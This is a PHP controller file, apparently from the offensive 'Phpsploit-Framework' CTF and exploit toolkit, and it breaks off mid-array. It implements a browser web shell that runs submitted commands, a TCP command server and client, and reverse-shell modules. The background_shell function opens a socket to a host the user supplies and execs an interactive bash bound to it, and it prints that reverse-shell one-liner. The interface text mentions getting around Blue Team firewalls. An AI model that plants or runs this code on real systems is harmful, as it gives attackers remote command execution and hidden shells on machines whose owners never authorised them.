<?php
/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-3
 * Time: 下午4:00
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Shell
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Shell_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function web_shell ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_type   = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_ENCODE_CRYPTO_JS );
        $_key    = ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] );
        $_iv     = ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] );
        $_result = array ();
        if ( ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) && ( is_integer ( $_type ) ) && ( Class_Base_Security ::is_phpsploit_encode_type ( $_type ) ) && ( is_string ( $_key ) ) && ( strlen ( $_key ) > 0 ) && ( is_string ( $_iv ) ) && ( strlen ( $_iv ) > 0 ) ) {
            if ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) {
                $_string = Class_Base_Security ::phpsploit_decode_128 ( $_string , $_key , $_iv );
                if ( ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) ) {
                    $_result                                                          = Class_Base_Shell ::command ( $_string );
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] = "";
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ]  = "";
                }
            }
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Shell Command Execute</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to execute shell environment commands. Note: shell commands such as top that require continuous output of results may not be executed properly! Shell environment communication has been encrypted using technical means, and the validity of the communication key is one-time under normal circumstances!</div>';
            $_form        = array (
                "action"    => "/shell/web_shell" ,
                "hiddens"   => array (
                    array (
                        "id"    => "encode_command" ,
                        "name"  => "string" ,
                        "value" => "" ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "id"      => "algo_type" ,
                        "title"   => "( Encode Type )   : " ,
                        "name"    => "type" ,
                        "options" => array (
                            array ( "describe" => "ENCODE_CRYPTO_JS" , "title" => "ENCODE_CRYPTO_JS" , "value" => Class_Base_Security::TYPE_ENCODE_CRYPTO_JS , "selected" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "algo_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "key" ,
                        "name"     => "key" ,
                        "value"    => "" ,
                    ) ,
                    array (
                        "id"       => "algo_iv" ,
                        "title"    => "( Encode IV ) : " ,
                        "describe" => "iv" ,
                        "name"     => "iv" ,
                        "value"    => "" ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => "show_command" ,
                        "title" => "( Shell Command )   : " ,
                        "name"  => "show_string" ,
                        "value" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_string ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_string , $_key , $_iv ) ) : ( $_string ) ) ,
                    ) ,
                    array (
                        "id"       => "result_data" ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_result ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( print_r ( $_result , true ) , $_key , $_iv ) ) : ( $_result ) ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">
function init(){ 
    document.getElementById("algo_key").value=aes_key;
    document.getElementById("algo_iv").value=aes_iv;
    if(document.getElementById("show_command").value!==""){
       document.getElementById("show_command").value=phpsploit_decode(document.getElementById("show_command").value,"' . $_key . '","' . $_iv . '");
    }
    if(document.getElementById("result_data").value!==""){
    document.getElementById("result_data").value=phpsploit_decode(document.getElementById("result_data").value,"' . $_key . '","' . $_iv . '"); 
    }
}
function to_submit(form_object){ 
    form_object.string.value=phpsploit_encode(document.getElementById("show_command").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("show_command").value=""; 
    console.log(phpsploit_decode(form_object.string.value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value)); 
    document.getElementById("algo_key").value="";
    document.getElementById("algo_iv").value="";
    console.log("form is submit"); 
    return true;
}
    </script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function server_shell_client ()
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        $_server_ip        = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_server_port      = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_token            = Class_Base_Request ::form ( "token" , Class_Base_Request::TYPE_STRING , "" );
        $_encode_key       = Class_Base_Request ::form ( "encode_key" , Class_Base_Request::TYPE_STRING , "" );
        $_encode_iv_base64 = Class_Base_Request ::form ( "encode_iv_base64" , Class_Base_Request::TYPE_STRING , "" );

        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/shell/server_shell_client" , array ( "ip" => $_server_ip , "port" => $_server_port , "token" => $_token , "encode_key" => $_encode_key , "encode_iv_base64" => $_encode_iv_base64 ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_result_data_id = "result_data";
            $_result         = "";
            $_result         .= "\n" . 'cli url : ' . $_cli_url . "\n";
            $_result         .= "\n" . 'cli encode url : ' . $_cli_encode_url . "\n";
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Shell Command Execute Client</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module functions as a shell environment client for bidirectional communication with the shell environment server. The transmission data has been technically encrypted, and the communication key is only valid in the current shell environment server! The current interface is only used to create command line parameters for Shell environment clients and does not directly establish a connection with Shell environment servers. If you want to establish a connection and communicate with the server, you need to execute a command with this syntax in the command line environment: php -f ' . htmlentities ( '<Build Phpsploit Framework Project file path> <cli encode URL>' ) . '</div>';
            $_form           = array (
                "action"    => "/shell/server_shell_client" ,
                "inputs"    => array (
                    array (
                        "id"       => "server_ip" ,
                        "title"    => "( Server IP Address ) : " ,
                        "describe" => "Server IP Address" ,
                        "name"     => "ip" ,
                        "value"    => ( ( ! empty( $_server_ip ) ) ? ( $_server_ip ) : ( '127.0.0.1' ) ) ,
                    ) ,
                    array (
                        "id"       => "server_port" ,
                        "title"    => "( Server IP Port ) : " ,
                        "describe" => "Server IP Port" ,
                        "name"     => "port" ,
                        "value"    => ( ( ! empty( $_server_port ) ) ? ( $_server_port ) : ( 0 ) ) ,
                    ) ,
                    array (
                        "id"       => "token" ,
                        "title"    => "( Auth Token ) : " ,
                        "describe" => "Auth Token" ,
                        "name"     => "token" ,
                        "value"    => ( ( ! empty( $_token ) ) ? ( $_token ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "encode_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "Encode Key" ,
                        "name"     => "encode_key" ,
                        "value"    => ( ( ! empty( $_encode_key ) ) ? ( $_encode_key ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "encode_iv_base64" ,
                        "title"    => "( Encode IV Base64 ) : " ,
                        "describe" => "Encode IV Base64" ,
                        "name"     => "encode_iv_base64" ,
                        "value"    => ( ( ! empty( $_encode_iv_base64 ) ) ? ( ( str_replace ( ' ' , '+' , $_encode_iv_base64 ) ) ) : ( '' ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_result_data_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            if ( is_cli () ) {
                if ( ( is_string ( $_server_ip ) ) && ( strlen ( $_server_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_server_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_server_ip ) ) ) && ( is_integer ( $_server_port ) ) && ( ( ( $_server_port ) > 0 ) && ( $_server_port < 65536 ) ) && ( ( is_string ( $_token ) ) && ( strlen ( $_token ) == 32 ) ) && ( ( is_string ( $_encode_key ) ) && ( strlen ( $_encode_key ) == 32 ) ) && ( ( ! empty( $_encode_iv_base64 ) ) && ( is_string ( $_encode_iv_base64 ) ) && ( strlen ( $_encode_iv_base64 ) < 256 ) ) ) {
                    Class_Operate_SocketServerShell ::start_client ( $_server_ip , $_server_port , $_token , $_encode_key , $_encode_iv_base64 );
                }
            }
        }
        return null;

    }

    public static function server_shell ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start              = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_listen_ip          = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_listen_port        = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_max_connect_number = Class_Base_Request ::form ( "max_connect_number" , Class_Base_Request::TYPE_INTEGER , 1 );
        $_max_execute_time   = Class_Base_Request ::form ( "max_execute_time" , Class_Base_Request::TYPE_INTEGER , 3600 );
        $_cli_url            = Class_Base_Response ::get_cli_url ( "/shell/server_shell" , array ( "start" => 1 , "ip" => $_listen_ip , "port" => $_listen_port , "max_connect_number" => $_max_connect_number , "max_execute_time" => $_max_connect_number ) );
        $_cli_encode_url     = Class_Base_Response ::get_urlencode ( $_cli_url );
        $_result             = "";
        if ( empty( $_start ) ) {
            $_result .= ( 'cli url : ' . $_cli_url ) . "\n\n" . ( 'cli encode url : ' . ( $_cli_encode_url ) ) . "\n\n";
        }
        $_connect_domain_List_id = "result_data";
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Shell Command Execute Server</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This is a Server Shell environment based on TCP protocol connection (which can support team collaboration environment and is suitable for team combat mode during CTF competitions) , using temporarily issued communication tokens for communication identity authentication. Note that all tokens issued in this instance are only valid in the server shell environment created in that instance. When the Server Shell environment is shut down and restarted again, a new communication token will be generated, and the old communication token will become invalid!You need to provide the generated "token, decode_key, decode_iv" information to the client of the shell environment for successful establishment and execution of bidirectional communication (when the client of the shell environment fails to obtain the correct "token, decode_key, decode_iv" information, normal communication connection cannot be established with the server of the shell environment). If you want to stop this instance of the server shell environment, you need Call the client of the shell environment, And send the" exit "command to end the current instance of the shell environment running on the server. If you only want to end the communication connection established between the current instance and the server shell environment, you only need to use the client of the shell environment to send the" quit "command to the server of the shell environment. Warning! When you start a server shell environment instance in the web interface, other functions in the current web environment will become unusable! If the target host for your current penetration testing or security audit behavior is still running other businesses, you should never use this feature in the web environment, as it will make other businesses in the web environment unusable! The functionality of this module is currently only applicable to web environments without other business operations, as well as relatively independent command-line environments!</div>';
            $_form_name   = "form_0";
            $_form        = array (
                "action"    => "/shell/server_shell" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "listen_ip" ,
                        "title"    => "( Listen IP Address ) : " ,
                        "describe" => "listen IP Address" ,
                        "name"     => "ip" ,
                        "value"    => ( ( ! empty( $_listen_ip ) ) ? ( $_listen_ip ) : ( '127.0.0.1' ) ) ,
                    ) ,
                    array (
                        "id"       => "listen_port" ,
                        "title"    => "( Listen IP Port ) : " ,
                        "describe" => "listen IP Port" ,
                        "name"     => "port" ,
                        "value"    => ( ( ! empty( $_listen_port ) ) ? ( $_listen_port ) : ( rand ( 40000 , 49999 ) ) ) ,
                    ) ,
                    array (
                        "id"       => "max_connect_number" ,
                        "title"    => "( Max Connect Number ) : " ,
                        "describe" => "Max Connect Number" ,
                        "name"     => "max_connect_number" ,
                        "value"    => $_max_connect_number ,
                    ) ,
                    array (
                        "id"       => "max_execute_time" ,
                        "title"    => "( Max Execute Time ) : " ,
                        "describe" => "Max Execute Time" ,
                        "name"     => "max_execute_time" ,
                        "value"    => $_max_execute_time ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_connect_domain_List_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Shell Server Environment )" ,
                    "name"  => "submit_form" ,
                    "value" => "start shell server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Shell Server Environment Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Shell Server Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( ! empty( $_start ) ) && ( is_string ( $_listen_ip ) ) && ( strlen ( $_listen_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_listen_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_listen_ip ) ) ) && ( is_integer ( $_listen_port ) ) && ( ( ( $_listen_port ) > 0 ) && ( $_listen_port < 65536 ) ) && ( is_integer ( $_max_connect_number ) ) && ( ( $_max_connect_number <= 10 ) ) && ( is_integer ( $_max_execute_time ) ) && ( $_max_execute_time >= 0 ) && ( is_string ( $_connect_domain_List_id ) ) ) {
            Class_Operate_SocketServerShell ::start ( $_listen_ip , $_listen_port , $_max_connect_number , $_max_execute_time , $_connect_domain_List_id );
        }
        return null;
    }

    public static function reverse_shell ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start                  = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_listen_ip              = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_listen_port            = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_max_connect_number     = Class_Base_Request ::form ( "max_connect_number" , Class_Base_Request::TYPE_INTEGER , 1 );
        $_max_execute_time       = Class_Base_Request ::form ( "max_execute_time" , Class_Base_Request::TYPE_INTEGER , 3600 );
        $_connect_domain_List_id = "result_data";
        $_form_listen_ip         = ( ( ! empty( $_listen_ip ) ) ? ( $_listen_ip ) : ( '127.0.0.1' ) );
        $_form_listen_port       = ( ( ! empty( $_listen_port ) ) ? ( $_listen_port ) : ( rand ( 40000 , 49999 ) ) );
        $_cli_url                = Class_Base_Response ::get_cli_url ( "/shell/reverse_shell" , array ( "start" => 1 , "ip" => $_form_listen_ip , "port" => $_form_listen_port , "max_connect_number" => $_max_connect_number , "max_execute_time" => $_max_connect_number ) );
        $_cli_encode_url         = Class_Base_Response ::get_urlencode ( $_cli_url );
        $_result                 = "";
        if ( empty( $_start ) ) {
            $_result .= ( 'cli url : ' . $_cli_url ) . "\n\n" . ( 'cli encode url : ' . ( $_cli_encode_url ) ) . "\n\n";
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Reverse Shell Connection To Client</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This is a client shell environment based on TCP protocol connection (connected to the server through rebound mode, supporting single person working mode. During CTF matches, it can be used to break through the filtering and interception of data communication by the Blue Team firewall), using temporarily issued communication tokens for communication authentication. When you use the (reverse shell) mode to send shell environment commands, You need to carry a temporary token every time the command is sent For security reasons, when you want to use your specific encapsulated custom server, the temporary token sent along with the command can play a certain authentication role. This is mainly to prevent third-party applications from intervening in the protocol layer and impersonating your identity to send command information to the client. Of course, this setting may bring some inconvenience to your operation, such as when sending a command every time, you need to Use this format: ' . Class_Base_Format ::htmlentities ( "<token> <shell command>" ) . '). In order to be compatible with the usage habits of most moral hackers, in addition to this (reverse shell) mode, the Phpsploit Framework software also provides a (background_shell) background mode to achieve the traditional rebound connection shell environment.Please note that all tokens published in this instance (reverse_shell) are only valid in the client shell environment created in that instance. When the Client Shell environment shuts down and restarts, a new communication token will be generated, and the old communication token will become invalid! If you want to stop this instance of the client shell environment, you need to send the "exit" command to the client of the shell environment to end the current instance of the shell environment running on the client. Warning! When you start a client shell environment instance in the web interface, other functions in the current web environment will become unavailable! If the target host of your current penetration testing or security audit behavior is still running other businesses, you should never use this feature in a web environment, as it will make other businesses in the web environment unusable! The functionality of this module is currently only applicable to web environments without other business operations, as well as relatively independent command-line environments!</div>';
            $_form_name   = "form_0";
            $_form        = array (
                "action"    => "/shell/reverse_shell" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "listen_ip" ,
                        "title"    => "( Server IP Address ) : " ,
                        "describe" => "Server IP Address" ,
                        "name"     => "ip" ,
                        "value"    => $_form_listen_ip ,
                    ) ,
                    array (
                        "id"       => "listen_port" ,
                        "title"    => "( Server IP Port ) : " ,
                        "describe" => "Server IP Port" ,
                        "name"     => "port" ,
                        "value"    => $_form_listen_port ,
                    ) ,
                    array (
                        "id"       => "max_connect_number" ,
                        "title"    => "( Max Connect Number ) : " ,
                        "describe" => "Max Connect Number" ,
                        "name"     => "max_connect_number" ,
                        "value"    => $_max_connect_number ,
                    ) ,
                    array (
                        "id"       => "max_execute_time" ,
                        "title"    => "( Max Execute Time ) : " ,
                        "describe" => "Max Execute Time" ,
                        "name"     => "max_execute_time" ,
                        "value"    => $_max_execute_time ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_connect_domain_List_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Client Shell Environment Connection To Server )" ,
                    "name"  => "submit_form" ,
                    "value" => "connection to server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Client Shell Environment Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Client Shell Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( ! empty( $_start ) ) && ( is_string ( $_listen_ip ) ) && ( strlen ( $_listen_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_listen_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_listen_ip ) ) ) && ( is_integer ( $_listen_port ) ) && ( ( ( $_listen_port ) > 0 ) && ( $_listen_port < 65536 ) ) && ( is_integer ( $_max_connect_number ) ) && ( ( $_max_connect_number <= 10 ) ) && ( is_integer ( $_max_execute_time ) ) && ( $_max_execute_time >= 0 ) && ( is_string ( $_connect_domain_List_id ) ) ) {
            Class_Operate_SocketShell ::start ( $_listen_ip , $_listen_port , $_max_connect_number , $_max_execute_time , $_connect_domain_List_id );
        }
        return null;
    }

    public static function background_shell ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start                = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_listen_ip            = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_listen_port          = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_md5_token            = Class_Base_Request ::form ( "md5_token" , Class_Base_Request::TYPE_STRING , ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) );
        $_listen_ip            = str_replace ( "\r\n" , "" , $_listen_ip );
        $_socket               = null;
        $_errno                = 0;
        $_errstr               = "";
        $_function_call_info_1 = null;
        $_function_call_info_2 = null;

        if ( ( ! empty( $_start ) ) && ( is_string ( $_listen_ip ) ) && ( strlen ( $_listen_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_listen_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_listen_ip ) ) ) && ( is_integer ( $_listen_port ) ) && ( ( ( $_listen_port ) > 0 ) && ( $_listen_port < 65536 ) ) ) {
            $sock = fsockopen ( $_listen_ip , $_listen_port , $_errno , $_errstr );
            if ( ( ! empty( $sock ) ) && ( $_errno == 0 ) && ( $_errstr == "" ) ) {
                if ( is_cli () ) {
                    Class_Base_Response ::outputln ( "\nexec php code : " . ( '$socket = fsockopen ( "' . $_listen_ip . '" , ' . $_listen_port . ' ) ; ' . chr ( 32 ) . 'exec ( "/bin/bash -i <&5 >&5 2>&5" ) ; ' ) . "\n" );
                }
                if ( ! is_cli () ) {
                    $_exec_result = exec ( "/bin/bash -i <&4 >&4 2>&4" , $_output );
                } else {
                    $_exec_result = exec ( "/bin/bash -i <&5 >&5 2>&5" , $_output );
                }
                if ( is_cli () ) {
                    Class_Base_Response ::outputln ( array ( "exec_result" => array ( $_output , $_exec_result ) ) );
                }
            } else {
                if ( is_cli () ) {
                    Class_Base_Response ::outputln ( "The creation of a rebound connection to port {$_listen_ip}:{$_listen_port} failed with failure code {$_errno} and prompt {$_errstr}" );
                }
            }
        }
        $_listen_ip              = ( ( ! empty( $_listen_ip ) ) ? ( $_listen_ip ) : ( '127.0.0.1' ) );
        $_listen_port            = ( ( ! empty( $_listen_port ) ) ? ( $_listen_port ) : ( rand ( 40000 , 49999 ) ) );
        $_cli_url                = Class_Base_Response ::get_cli_url ( "/shell/background_shell" , array ( "start" => 1 , "ip" => $_listen_ip , "port" => $_listen_port , ) );
        $_cli_encode_url         = Class_Base_Response ::get_encode_cli_url ( $_cli_url );
        $_connect_domain_List_id = "result_data";
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Establish a connection channel environment based on backend shell</div>';
            $_form_top    .= '<div style="width:100%;word-break:break-all;margin-top:32px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">The current module (background_shell) is used to establish a reverse shell environment network connection channel from the client to the server. Once the channel is successfully established, the client will become the reverse shell environment of the server (until the server actively disconnects using the exit command). Note: Due to access permissions and the unique nature of the web environment, the current background_ Shell modules may not execute correctly in a web environment. A more effective method is to use CLI mode (command line mode) to run background_ Shell module.</div>';
            $_form_name   = "form_0";
            $_form        = array (
                "action"    => "/shell/background_shell" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "listen_ip" ,
                        "title"    => "( Server IP Address ) : " ,
                        "describe" => "Server IP Address" ,
                        "name"     => "ip" ,
                        "value"    => $_listen_ip ,
                    ) ,
                    array (
                        "id"       => "listen_port" ,
                        "title"    => "( Server IP Port ) : " ,
                        "describe" => "Server IP Port" ,
                        "name"     => "port" ,
                        "value"    => $_listen_port ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_connect_domain_List_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
